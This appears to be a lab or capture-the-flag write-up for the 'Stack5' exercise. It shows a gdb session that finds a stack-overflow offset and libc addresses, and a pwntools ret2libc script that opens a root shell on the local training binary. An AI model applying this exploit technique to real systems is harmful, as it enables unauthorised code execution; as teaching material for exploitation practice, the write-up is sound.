### Stack5

* Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buffer[64];

    gets(buffer);
}
```

* Solution

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080483c4 <+0>:	push   ebp
   0x080483c5 <+1>:	mov    ebp,esp
   0x080483c7 <+3>:	and    esp,0xfffffff0
   0x080483ca <+6>:	sub    esp,0x50
   0x080483cd <+9>:	lea    eax,[esp+0x10]
   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:	call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:	leave  
   0x080483da <+22>:	ret    
End of assembler dump.
gdb-peda$ b *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/Desktop/bin/stack5 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
EAX: 0xffffd310 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xf7fa85c0 --> 0xfbad2288 
EDX: 0xf7fa989c --> 0x0 
ESI: 0xf7fa8000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd35c ("AA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x80483da (<main+22>:	ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483d1 <main+13>:	mov    DWORD PTR [esp],eax
   0x80483d4 <main+16>:	call   0x80482e8 <gets@plt>
   0x80483d9 <main+21>:	leave  
=> 0x80483da <main+22>:	ret    
   0x80483db:	nop
   0x80483dc:	nop
   0x80483dd:	nop
   0x80483de:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd35c ("AA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd360 ("AJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd364 ("fAA5AAKAAgAA6AAL")
0012| 0xffffd368 ("AAKAAgAA6AAL")
0016| 0xffffd36c ("AgAA6AAL")
0020| 0xffffd370 ("6AAL")
0024| 0xffffd374 --> 0x0 
0028| 0xffffd378 --> 0xf7fa8000 --> 0x1d5d8c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080483da in main (argc=<error reading variable: Cannot access memory at address 0x65414151>, argv=<error reading variable: Cannot access memory at address 0x65414155>) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
gdb-peda$ pattern offset AA4AAJAAfAA5AAKAAgAA6AAL
AA4AAJAAfAA5AAKAAgAA6AAL found at offset: 76
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e0f7e0 <system>
gdb-peda$ disass system
Dump of assembler code for function system:
   0xf7e0f7e0 <+0>:	sub    esp,0xc
   0xf7e0f7e3 <+3>:	mov    eax,DWORD PTR [esp+0x10]
   0xf7e0f7e7 <+7>:	call   0xf7f0791d
   0xf7e0f7ec <+12>:	add    edx,0x198814
   0xf7e0f7f2 <+18>:	test   eax,eax
   0xf7e0f7f4 <+20>:	je     0xf7e0f800 <system+32>
   0xf7e0f7f6 <+22>:	add    esp,0xc
   0xf7e0f7f9 <+25>:	jmp    0xf7e0f2f0
   0xf7e0f7fe <+30>:	xchg   ax,ax
   0xf7e0f800 <+32>:	lea    eax,[edx-0x59690]
   0xf7e0f806 <+38>:	call   0xf7e0f2f0
   0xf7e0f80b <+43>:	test   eax,eax
   0xf7e0f80d <+45>:	sete   al
   0xf7e0f810 <+48>:	add    esp,0xc
   0xf7e0f813 <+51>:	movzx  eax,al
   0xf7e0f816 <+54>:	ret    
End of assembler dump.
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4e968 ("/bin/sh")
gdb-peda$ quit

root@kali:~/Desktop/bin# cat stack5_ex2.py 
from pwn import *

system     = p32(0xf7e0f7e0)

dummy      = p32(0xffffffff)

binsh_addr = p32(0xf7f4e968)
offset     = 76

payload = "A"*offset + system + dummy + binsh_addr

p = process(['./stack5'])

p.sendline(payload)

p.interactive()

root@kali:~/Desktop/bin# python stack5_ex2.py 
[+] Starting local process './stack5': pid 3631
[*] Switching to interactive mode
$ whoami
root
$  
```
